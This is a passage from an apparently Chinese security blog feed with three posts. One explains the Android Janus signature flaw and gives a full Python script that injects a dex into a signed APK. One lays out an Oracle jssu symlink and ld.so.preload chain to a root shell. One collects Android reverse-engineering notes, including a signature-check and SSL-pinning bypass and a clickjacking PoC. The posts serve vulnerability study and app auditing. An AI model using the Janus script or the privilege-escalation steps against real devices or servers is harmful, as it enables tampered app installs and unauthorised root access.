href="https://github.com/ScottyBauer/Android_Kernel_CVE_POCs/blob/master/CVE-2017-0516.c">POC来自这里</a></p><h2 id="Janus签名漏洞-CVE-2017-13156"><a href="#Janus签名漏洞-CVE-2017-13156" class="headerlink" title="Janus签名漏洞(CVE-2017-13156)"></a>Janus签名漏洞(CVE-2017-13156)</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Android4.4 以后引入 art虚拟机，相比只能执行 apk 的 dvm，art 既可以执行 apk，也可以执行优化后的 dex，通过魔数来区分。</p><p>Zip 文件的读取方式是读文件末尾定位的 central directory，然后通过里面的索引定位到各个 zip entry，每个 entry 解压之后都对应一个文件。ParseZipArchive 函数在进行以上处理时候并没有判断文件头部的魔数是否为504B0304(即Zip)。</p><p>因此根据以上两点，攻击者可以通过将恶意 dex 文件放到 apk 文件的头部，在系统安装 apk 文件时，系统安装器解压 zip 时并没有先判断 apk 文件的头部 magic 字段，直接默认是 apk(zip) 文件，从而直接从文件尾部进行读取解压，此时签名没有任何变化，因此可欺骗系统，进行安装。</p><p>在用户运行 apk 时，ART 虚拟机会去判断文件头部的 magic 字段，从而执行恶意 dex。</p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> adler32</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_checksum</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    生成sha1 hash</span></span><br><span class="line"><span class="string">    "&lt;L" 小端存储unsigned long</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(data[<span class="number">32</span>:])</span><br><span class="line">    data[<span class="number">12</span>:<span class="number">12</span>+<span class="number">20</span>] = m.digest()</span><br><span class="line">    v = adler32(buffer(data[<span class="number">12</span>:])) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    data[<span class="number">8</span>:<span class="number">12</span>] = struct.pack(<span class="string">"&lt;L"</span>, v)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"usage: %s dex apk out_apk"</span> % __file__)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    _, dex, apk, out_apk = sys.argv</span><br><span class="line">    <span class="keyword">with</span> open(dex, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        dex_data = bytearray(f.read())</span><br><span class="line">    dex_size = len(dex_data)</span><br><span class="line">    <span class="keyword">with</span> open(apk, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        apk_data = bytearray(f.read())</span><br><span class="line">    cd_end_addr = apk_data.rfind(<span class="string">'\x50\x4b\x05\x06'</span>)</span><br><span class="line">    cd_start_addr = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>])[<span class="number">0</span>]</span><br><span class="line">    apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>] = struct.pack(<span class="string">"&lt;L"</span>, cd_start_addr+dex_size)</span><br><span class="line">    pos = cd_start_addr</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; cd_end_addr):</span><br><span class="line">        offset = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>])[<span class="number">0</span>]</span><br><span class="line">        apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>] = struct.pack(<span class="string">"&lt;L"</span>, offset+dex_size)</span><br><span class="line">        pos = apk_data.find(<span class="string">"\x50\x4b\x01\x02"</span>, pos+<span class="number">46</span>, cd_end_addr)</span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    out_data = dex_data + apk_data</span><br><span class="line">    out_data[<span class="number">32</span>:<span class="number">36</span>] = struct.pack(<span class="string">"&lt;L"</span>, len(out_data))</span><br><span class="line">    update_checksum(out_data)</span><br><span class="line">    <span class="keyword">with</span> open(out_apk, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(out_data)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%s generated'</span> % out_apk)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.cc</span><br><span class="line">index <span class="number">78</span>de40a..d0bbd72 <span class="number">100644</span></span><br><span class="line">--- a/libziparchive/zip_archive.cc</span><br><span class="line">+++ b/libziparchive/zip_archive.cc</span><br><span class="line">@@ <span class="number">-441</span>,<span class="number">6</span> +<span class="number">441</span>,<span class="number">22</span> @@</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">uint32_t</span> lfh_start_bytes;</span><br><span class="line">+  <span class="comment">//读取zip头部信息</span></span><br><span class="line">+  <span class="keyword">if</span> (!archive-&gt;mapped_zip.ReadAtOffset(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(&amp;lfh_start_bytes),</span><br><span class="line">+                                        <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), <span class="number">0</span>)) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Unable to read header for entry at offset == 0."</span>);</span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   <span class="comment">//增加kSignature头部验证，不同时返回-1</span></span><br><span class="line">+  <span class="keyword">if</span> (lfh_start_bytes != LocalFileHeader::kSignature) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Entry at offset zero has invalid LFH signature %"</span> PRIx32, lfh_start_bytes);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">if</span> defined(__ANDROID__)</span></span><br><span class="line">+    android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">"64211847"</span>);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   ALOGV(<span class="string">"+++ zip good scan %"</span> PRIu16 <span class="string">" entries"</span>, num_entries);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原来 Android 就是这么被 root 的。结尾有彩蛋，Janus 分析。&lt;/p&gt;
&lt;p&gt;先贴一个&lt;a href=&quot;https://elixir.bootlin.com/linux/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux源码阅读的网
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>关于 Oracle 的一条攻击链</title>
    <link href="https://github.com/Cracke-S-J/2020/04/01/%E5%85%B3%E4%BA%8EOracle%E7%9A%84%E4%B8%80%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE/"/>
    <id>https://github.com/Cracke-S-J/2020/04/01/%E5%85%B3%E4%BA%8EOracle%E7%9A%84%E4%B8%80%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE/</id>
    <published>2020-04-01T07:08:14.000Z</published>
    <updated>2020-04-03T16:49:58.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这是 CVE-2019-2444。背景是有一个程序叫 jssu，是为 Oracle Scheduler 提供服务的组件，它的一些权限配置有问题，导致可以符号链接攻击造成提权。但是前提要有 oracle 账号，但是这可以配合 CVE-2018-3004 这个 Java 反序列化漏洞绕过 Oracle JVM 的一些安全机制，拿到 oracel 用户权限。</p><h2 id="CVE-2018-3004"><a href="#CVE-2018-3004" class="headerlink" title="CVE-2018-3004"></a>CVE-2018-3004</h2><p>CVE-2018-3004 简单介绍两句，XMLDecoder 反序列化，组装的时候，调用的方法是不被 Jvm 限制的，所以可以构造一个 FileWriter，实现 oracle 用户权限的任意写入。然后用本文主要介绍的这个 CVE 对它进行提权。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>主要有几下几个条件组合，成就了这个攻击：</p><ol><li>jssu 程序所在组是 oinstall，跟 oracle 同组，所有者是 root，设置了 suid，权限是 4750。</li><li>jssu 运行会生成一个日志文件，名字可以通过进程名得到，用户组跟 jssu 同组，权限是当前用户的 umask。</li></ol><p>所以就有了符号链接攻击思路，用 oracle 把那个日志文件挂上软链接，程序启动这样我们就有向任意文件写的能力，而且些文件读写权限 oracle 可控。如果软链接到 /etc/ld.so.preload，用可以来提权了。</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>准备一个 /bin/bash；准备一个 so，插桩 hook geteuid 函数，来修改之前准备那个 /bin/bash 的权限为 04777，修改用户和用户组为 root。</li><li>构建一个可执行程序，先设置 umask 为 0000(为什么不是0666?)；然后 fork 子进程启动 jssu；父进程预判，给 jssu 的日志创建符号链接，等一段时间子进程输出内容以后把子进程 kill 掉。此时 /etc/ld.so.preload 已经被创建，所属用户 root，所属用户组 oinstall，权限 0666，内容为 jssu 的日志。</li><li>用 oracle 用户修改 /etc/ld.so.preload，把之前准备的 so 写入里面。</li><li>等待一个root权限进程调用 geteuid 函数，触发插桩的代码。这一步可以直接在命令行运行<code>sudo 2&gt;/dev/null &gt;/dev/null</code>，此时，之前准备的那个 shell 就被完成了权限修改，任意用户都可以通过在命令行运行这个 shell 获得一个 root 权限的 shell。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;这是 CVE-2019-2444。背景是有一个程序叫 jssu，是为 Oracle Scheduler 提供服务的组件，它的一些权限配置有问
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Android 逆向知识整理</title>
    <link href="https://github.com/Cracke-S-J/2020/03/31/android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/03/31/android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</id>
    <published>2020-03-31T08:40:34.000Z</published>
    <updated>2020-04-02T14:14:19.852Z</updated>
    
    <content type="html"><![CDATA[<p>通常会拿到一个 apk，然后分析它的攻击面。我之前太自负了，从来没有系统整理过。</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>先大致查一下壳，不过现在有通用脱壳机一般不 care 这个。我一般是解压看一下。</p><h3 id="工具脱"><a href="#工具脱" class="headerlink" title="工具脱"></a>工具脱</h3><h4 id="Fdex2"><a href="#Fdex2" class="headerlink" title="Fdex2"></a>Fdex2</h4><p>一个 Xposed 插件，能脱一代壳。只是 hook 是相应的 dex 加载点。</p><h4 id="VitualApp"><a href="#VitualApp" class="headerlink" title="VitualApp"></a>VitualApp</h4><p>Bangcle 东明大佬魔改的 VitualApp，主要特点是不用 root，可以脱类抽，不过 load 所有类的时候可能会卡死。</p><h4 id="FART"><a href="#FART" class="headerlink" title="FART"></a>FART</h4><p>没用过，听说是刷机。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>Frida 脚本，可脱一代二代，hook loadClass，把相关功能点一点，就对应的内容会回填，填完了再 dump 出来即可。</p><h3 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h3><p>用 IDA 调，缺点是要过反调，一般是上面操作解决不了问题才上手，主要是脱 vmp 壳。</p><p>要分析它的指令替换的操作，正确地回填才能看到代码。也是体力活。</p><p>例如<a href="https://bbs.pediy.com/thread-257061.htm" target="_blank" rel="noopener">这个</a>。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><ol><li>我习惯 adb shell dumpsys activity top，从顶层 view 开始入手分析。</li><li>还可以调试，看它调用栈。</li><li>还可以 hook 打 log 出来帮忙分析。</li><li>总之就是经验+耐心。</li></ol><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><ol><li>基本就是过反调，可以用 Xposed 或者也有其它工具一键反调。smali。</li><li>so 的反调要看套路，要改转发端口，改名字，搜一下 kill、exit 之类的。</li><li>还有就是 IDA 要用熟吧。</li></ol><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h3><ol><li>不能 findAndHook 接口和抽象方法。</li><li>子类没有重写父类方法也能 hook 到。</li><li>使用 XposedBridge.hookAllMethods 拦截抽象方法的具体实现方法。</li><li>只能 hook Java 层。</li><li>带壳 app 要让壳先 attachBaseContext，再用之后那个 classLoader。</li><li>找不到参数，用 Xposed 自身提供的 XposedHelpers 的 findClass方法加载每一个类，然后再将得到的类传递给 hook 函数作参数。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available) &#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> application = Java.use(<span class="string">"android.app.Application"</span>);</span><br><span class="line">        <span class="keyword">var</span> reflectClass = Java.use(<span class="string">"java.lang.Class"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"application: "</span> + application);</span><br><span class="line"></span><br><span class="line">        application.attach.overload(<span class="string">'android.content.Context'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.attach(context); <span class="comment">// 先执行原来的attach方法</span></span><br><span class="line">            <span class="keyword">var</span> classloader = context.getClassLoader(); <span class="comment">// 获取classloader</span></span><br><span class="line">            Java.classFactory.loader = classloader;</span><br><span class="line">            <span class="comment">//这不里能直接使用Java.use，因为java.use会检查在不在perform里面，不在就会失败</span></span><br><span class="line">            <span class="keyword">var</span> AyWelcome = Java.classFactory.use(<span class="string">"flytv.run.monitor.fragment.user.AyWelcome"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"AyWelcome: "</span> + AyWelcome);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h3><ol><li>可 hook Java 层和 C 层。</li><li>可以早期无痛注入。Frida 在注入进程的时候，会使用 ptrace 来完成，所以在遇到具备反调试的应用时（如各种壳），会导致注入失败。测试发现，Frida 仅仅在注入的时候会使用 ptrace，只要在壳运行之前进行注入，可以无视各种反调试。使用Xposed进行辅助，在应用才运行的时候，按需暂停5s，再注入Frida脚本。</li></ol><h2 id="过签名校验"><a href="#过签名校验" class="headerlink" title="过签名校验"></a>过签名校验</h2><p>先大致看一下是不是无脑校验。如果无脑不用管。</p><p>在对APK进行签名的时候，签名工具会将包含原始签名信息的 .RSA/.DSA 文件放入APK（zip压缩包）的 /META-INF/ 目录下。在APK安装的时候，Android Framework 会使用其自身的机制对APK包中的文件进行完整性校验。同时，Android 应用本身也可以通过 android.content.pm.Signature 获取自身的签名信息，参考这里，如 Issuer、公钥等。如果 Android 应用在代码中预置了公钥，可通过比较公钥的方式进行完整性保护，确保当前的 APK 由开发者签发。</p><p>由于上述方法校验过程中需要调用系统相关的函数获取公钥，因此，可以通过热补丁的方式拦截当前 Android 应用运行时的 API 调用，在其获取签名的时候返回原始的信息，欺骗 Android 应用，让其认为获取到了原始的签名信息。</p><p>这里使用了阿里巴巴开源的热补丁框架 AndFix 进行 API 的调用拦截。AndFix 具有较好的兼容性，兼容市面上大多数机型、系统版本。使用该框架可以在运行时对指定的系统函数进行拦截，修改目标函数的执行逻辑。</p><p>还有一个什么方法，是字节的二面面试官提的，没听清，也不知道怎么联系，害，还有梆梆的什么技术也没听清，该死的信号。</p><h2 id="抓包问题"><a href="#抓包问题" class="headerlink" title="抓包问题"></a>抓包问题</h2><p>先 JustTrustMe 过掉所有官方客户端校验。</p><h3 id="如果抓不到包"><a href="#如果抓不到包" class="headerlink" title="如果抓不到包"></a>如果抓不到包</h3><ol><li>看是不是对证书做了强制校验，如果是，Xposed 掉。</li><li>看是不是不走代理，NO_Proxy、HttpURLConnection。</li><li>试试 ProxyDroid。</li><li>它走的非 http/https，打开 wireshark，确认一下传输协议。</li></ol><h3 id="时而抓到时而抓不到"><a href="#时而抓到时而抓不到" class="headerlink" title="时而抓到时而抓不到"></a>时而抓到时而抓不到</h3><ol><li>可能是遇到了 okhttp 有路由选择，运行时保存多条路由线路，当网络不通时，马上切换到下一条，其中包括 no_proxy 线路。可以 hook 此方法让每次切换的路由失败；也可能hook相关的调用些方法的类，让在网络超时后，不调用这个切换路由的方法，搜一下关键函数<code>RouteSelector.resetNextProxy(HttpUrl url, Proxy proxy)</code>。</li><li>用到 okhttp 的 Certificate Pinning 进行通信的，进行 hook droidproxy 等强制路由有可能会导致 ssl 握手失败，在 Xposed 里面装个 <a href="https://github.com/ac-pm/SSLUnpinning_Xposed">SSLUnpinning</a> 就解决问题了。</li></ol><h3 id="收不到返回包"><a href="#收不到返回包" class="headerlink" title="收不到返回包"></a>收不到返回包</h3><p>服务端也做了校验，（只能从客户端找证书？）。</p><h3 id="有二次加密"><a href="#有二次加密" class="headerlink" title="有二次加密"></a>有二次加密</h3><p>恭喜获得逆向之旅。找到加密函数以及密钥或者固定密钥写插件去破解它得到明文。</p><h3 id="正确的校验姿势"><a href="#正确的校验姿势" class="headerlink" title="正确的校验姿势"></a>正确的校验姿势</h3><p>客户端和服务端要建立对称加密通信。服务端生成公私钥对，把公钥用证书签名，发送给客户端，客户端校验证书，然后用这个公钥对对称加密的密钥加密，然后发送给服务端，服务端用私钥给公钥解密，然后它们就用这个公钥进行加密通信。</p><h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><h3 id="二进制代码保护"><a href="#二进制代码保护" class="headerlink" title="二进制代码保护"></a>二进制代码保护</h3><ul><li>DEX 文件加固强度不足</li><li>缺少 DEX 代码(classes.dex)加密保护</li><li>缺少 Dalvik 反调试检测</li><li>缺少 Native 反调试检测</li><li>缺少 Native 代码注入检测</li><li>缺少 Native 库(.so文件)加密保护</li><li>缺少脚本代码(Javascript、Lua 等文件)加密保护</li><li>缺少敏感资源文件加密保护</li><li>缺少自身签名完整性校验</li><li>缺少自身文件完整性校验</li></ul><h3 id="用户数据安全"><a href="#用户数据安全" class="headerlink" title="用户数据安全"></a>用户数据安全</h3><ul><li>客户端明文存储敏感信息<ul><li>SharedPreferences</li><li>SQLite</li></ul></li><li>明文传输核心业务数据<ul><li>http</li><li>可能看到的 https</li></ul></li><li>允许备份标记没有设置为关闭<ul><li>android:allowBackup 为显式地 False</li></ul></li><li>敏感信息界面截屏未进行提示</li><li>调试日志输出敏感信息</li><li>缺少运行环境安全性检查（Root？安装 Xposed？）</li></ul><h3 id="数据传输保护"><a href="#数据传输保护" class="headerlink" title="数据传输保护"></a>数据传输保护</h3><ul><li>使用 HTTP 进行核心业务数据交互</li><li>使用 ALLOW_ALL_HOSTNAME_VERIFIER 忽略 SSL 证书域名验证</li><li>自定义 HostnameVerifier 忽略 SSL 证书域名验证</li><li>自定义 X509TrustManager 未正确校验 SSL 证书链</li><li>自定义 WebViewClient 忽略 SSL 证书校验异常</li><li>端口开放风险（Hint:netstat 看有没有开放可疑的端口，如果有，逆向之旅看有没有可能被利用，比如<code>虫洞</code>。</li></ul><h3 id="加密算法及密钥安全"><a href="#加密算法及密钥安全" class="headerlink" title="加密算法及密钥安全"></a>加密算法及密钥安全</h3><ul><li>不合理配置加密算法<ul><li>加密核心、敏感数据时使用了不安全的 DES 加密算法</li><li>AES 加密时是否使用了不安全的 ECB 模式</li><li>RSA 加密时每次加密的结果是否是一样的</li></ul></li><li>密钥明文硬编码</li></ul><h3 id="跨进程交互安全"><a href="#跨进程交互安全" class="headerlink" title="跨进程交互安全"></a>跨进程交互安全</h3><p>全用 Drozer 可以测，还有个什么超级拒绝服务漏洞检测也可，但是找不到了。</p><ul><li>导出组件 Activity 拒绝服务漏洞</li><li>导出组件 Service 拒绝服务漏洞</li><li>导出组件 Broadcast Receiver 拒绝服务漏洞</li><li>导出组件 Content Provider 数据泄露</li><li>导出组件 Content Provider SQL 注入漏洞</li><li>导出组件 Content Provider 目录遍历漏洞</li></ul><h3 id="其它-Android-应用规范"><a href="#其它-Android-应用规范" class="headerlink" title="其它 Android 应用规范"></a>其它 Android 应用规范</h3><ul><li>允许调试标记没有设置为关闭（android:debuggable，现在好像无所谓了，是真的无所谓）</li><li>WebView addJavaScriptInterface 远程代码执行漏洞</li><li>WebView 存在潜在跨站脚本攻击风险（grep “setJavaScriptEnabled”）</li><li>允许 WebView 访问本地任意脚本（setAllowFileAccess(false)；对本地文件校验）</li><li>WebView BadKernel 远程代码执行漏洞(CVE-2016-6754)(CNNVD-201608-414)（v8 引擎问题，用 WebView 访问<a href="https://secboom.com/vul/Badkernel.html" target="_blank" rel="noopener">Badkernel</a>）</li><li>App沙箱文件权限设置错误（Context.MODE_WORLD_READABLE 和 Context.MODE_WORLD_WRITABLE）</li><li>Janus 漏洞（zip 压缩包漏洞，不要用 v1 签名）</li><li>访问第三方页面时未进行提示</li><li>未校验二维码域名</li><li>地址随机化</li><li>堆栈保护</li><li>点击劫持（可还行）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>点击劫持 POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">Html,body,iframe&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">Display</span><span class="selector-pseudo">:block</span>;      <span class="comment">/*此处可以设为null*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">Height</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Margin</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Padding</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Border</span><span class="selector-pseudo">:nonne</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>点击劫持<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://XXX.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://XXX.com "</span> <span class="attr">scrolling</span>=<span class="string">"no"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   攻击URL</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在离开梆梆大半年了，不讨论离开的原因，夸一下梆梆。</p><p>有 Nemo 师傅和其它师傅带小弟，是真的香，还记得当初 Nemo 推荐我的方向、让我读的博客和代码，我全都没看完，是我不对，如果能耐心读完，肯定不止现在的代码能力。</p><p>每周五有技术分享（也不是每周），大家在一起讨论很酷的知识；还记得我分享的智能合约漏洞，一鸣大佬带着笔记过来听，还录屏录音（害，自闭自闭）。</p><p>团队很年轻，很有活力，每天都在学习和干活，大家在一起不会犯懒。</p><p>技术这边不是很官僚，当面试的时候看到一个好凶的大哥，不知道怎么叫，后来发现就是杰哥（手动狗头）；杰哥也是有个大哥的样子，虽然狡猾的很但是也很好的朋友。</p><p>非技术人员特别热情，叫一声 sj大佬 之类的，请教个问题，都特别到位，印象中好多售前、项目经理都特别好学，经常请教很多问题，让看代码就看代码，让改代码就改代码，让装 kali 就装 kali，没有接连否认自己不行。有的项目经理非科班出身，技术上也懂的很多。</p><p>还有有（较）硬核的 wiki，都是大佬们的骚操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通常会拿到一个 apk，然后分析它的攻击面。我之前太自负了，从来没有系统整理过。&lt;/p&gt;
&lt;h2 id=&quot;脱壳&quot;&gt;&lt;a href=&quot;#脱壳&quot; class=&quot;headerlink&quot; title=&quot;脱壳&quot;&gt;&lt;/a&gt;脱壳&lt;/h2&gt;&lt;p&gt;先大致查一下壳，不过现在有通用脱壳机一般不 
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Shadowsocks 协议漏洞</title>
